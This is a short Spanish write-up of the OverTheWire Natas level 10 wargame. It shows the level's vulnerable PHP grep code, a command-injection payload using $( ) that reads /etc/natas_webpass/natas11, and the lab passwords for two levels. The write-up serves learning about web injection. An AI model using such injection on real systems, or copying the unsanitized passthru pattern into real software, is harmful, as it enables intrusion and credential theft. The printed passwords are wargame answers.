# Natas 10

#### URL: http://natas10.natas.labs.overthewire.org/

#### Credenciales: natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

El nuevo codigo ahora escapa ciertos caracteres utiles para RCE:

``` php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Una forma de lograr esto es usando un subcomando como $(ls), entonces se expande a grep -i [fichero1] [fichero2] [fichero3] [fichero4] dictionary.txt entonces probando `c $( ls /etc/natas_webpass/natas11)`, con c siendo un caracter valido que contenga la contraseña, conseguimos las credenciales.

![2025-03-19-221036_883x650_scrot](https://github.com/user-attachments/assets/de2e7e0d-4e02-4ab9-baa2-d6d2465db089)

`natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

PD: En realidad simplemente `c /etc/natas_webpass/natas11` funciona igual :)

